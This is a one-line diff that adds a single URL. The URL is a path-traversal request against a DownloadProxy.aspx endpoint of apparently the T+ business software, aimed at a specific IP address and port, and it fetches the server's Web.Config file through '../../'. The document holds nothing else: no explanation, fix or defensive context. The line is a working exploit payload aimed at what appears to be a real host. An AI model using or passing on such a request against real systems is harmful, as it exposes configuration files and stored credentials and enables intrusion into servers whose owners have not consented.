@@ -1,0 +1,1 @@
+http://47.89.192.81:7788/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
